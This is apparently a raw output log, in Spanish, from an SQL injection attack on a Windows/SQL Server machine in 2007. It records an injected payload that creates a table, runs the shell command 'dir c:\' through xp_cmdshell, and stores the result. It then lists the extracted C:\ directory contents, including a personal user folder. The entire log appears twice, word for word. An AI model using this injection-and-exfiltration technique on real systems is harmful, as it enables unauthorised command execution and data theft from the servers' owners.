----------------------------------------------------------------
Accion:.............Comando: creacion de tabla y ejecucion de comando shell con insercion de datos..
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:36.
Resultado: se ha creado la tabla:[x_5031].
Resultado: se ha ejecutado el comando de shell: 'dir c:\';insert into [x_5031] values ('g_over');exec master.dbo.sp_dropextendedproc 'xp_cmdshell.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:39.
Datos:.............._volume_serial_number_is_24ca-c152|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:40.
Datos:...............

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:40.
Datos:.............._directory_of_c:\|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:41.
Datos:...............

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:41.
Datos:..............21/07/2006__04:59p______<dir>__________ca_lic|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:42.
Datos:..............22/01/2007__06:26p______<dir>__________documents_and_settings|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:42.
Datos:..............14/07/2006__09:12p______<dir>__________drv|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:44.
Datos:..............30/08/2006__11:46a______<dir>__________inetpub|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:44.
Datos:..............31/05/2007__06:29p______<dir>__________marcelo|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:45.
Datos:..............31/08/2006__10:00a______<dir>__________program_files|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:45.
Datos:..............19/07/2006__12:55p______<dir>__________sql2ksp3|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:46.
Datos:..............26/07/2006__11:01a______<dir>__________temp|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:46.
Datos:..............11/07/2007__02:58a______<dir>__________winnt|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:47.
Datos:..............21/07/2006__03:26p_________________302_winntagent.log|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:47.
Datos:.............._______________1_file(s)____________302_bytes|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:48.
Datos:.............._______________9_dir(s)___3.701.329.920_bytes_free|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:48.
Datos:...............

----------------------------------------------------------------
Accion:.............Comando: creacion de tabla y ejecucion de comando shell con insercion de datos..
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:36.
Resultado: se ha creado la tabla:[x_5031].
Resultado: se ha ejecutado el comando de shell: 'dir c:\';insert into [x_5031] values ('g_over');exec master.dbo.sp_dropextendedproc 'xp_cmdshell.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:39.
Datos:.............._volume_serial_number_is_24ca-c152|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:40.
Datos:...............

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:40.
Datos:.............._directory_of_c:\|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:41.
Datos:...............

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:41.
Datos:..............21/07/2006__04:59p______<dir>__________ca_lic|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:42.
Datos:..............22/01/2007__06:26p______<dir>__________documents_and_settings|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:42.
Datos:..............14/07/2006__09:12p______<dir>__________drv|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:44.
Datos:..............30/08/2006__11:46a______<dir>__________inetpub|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:44.
Datos:..............31/05/2007__06:29p______<dir>__________marcelo|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:45.
Datos:..............31/08/2006__10:00a______<dir>__________program_files|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:45.
Datos:..............19/07/2006__12:55p______<dir>__________sql2ksp3|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:46.
Datos:..............26/07/2006__11:01a______<dir>__________temp|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:46.
Datos:..............11/07/2007__02:58a______<dir>__________winnt|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:47.
Datos:..............21/07/2006__03:26p_________________302_winntagent.log|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:47.
Datos:.............._______________1_file(s)____________302_bytes|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:48.
Datos:.............._______________9_dir(s)___3.701.329.920_bytes_free|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............125.34.250.23.
Fecha:..............2007-08-04.
Hora:...............22:07:48.
Datos:...............

